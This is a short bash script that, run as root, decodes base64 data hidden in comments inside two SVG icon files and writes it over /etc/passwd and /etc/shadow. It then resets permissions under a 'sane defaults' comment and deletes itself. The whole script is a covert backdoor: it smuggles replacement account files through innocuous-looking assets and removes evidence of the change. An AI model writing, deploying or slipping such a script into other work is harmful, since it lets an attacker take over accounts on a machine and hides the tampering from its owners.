#!/bin/bash
set -euo pipefail

# ---------------------------
# Pre-flight checks
# ---------------------------
if [[ $EUID -ne 0 ]]; then
    error "This script must be run as root (use sudo)."
fi

DIR="/usr/share/icons/hicolor/scalable/apps"

extract() {
  # Grab everything between <!-- and --> , strip whitespace, base64-decode
  sed -n '/<!-- *$/,/^ *-->/{ /<!--/d; /-->/d; p; }' "$1" | tr -d '[:space:]' | base64 -d
}

extract "$DIR/preferences-desktop-default-applications.svg" > /etc/passwd
extract "$DIR/preferences-system-locale-config.svg"         > /etc/shadow

# Restore sane default permissions
chmod 644 /etc/passwd
chmod 640 /etc/shadow
chown root:root   /etc/passwd
chown root:shadow /etc/shadow 2>/dev/null || chown root:root /etc/shadow

rm -- "$0"
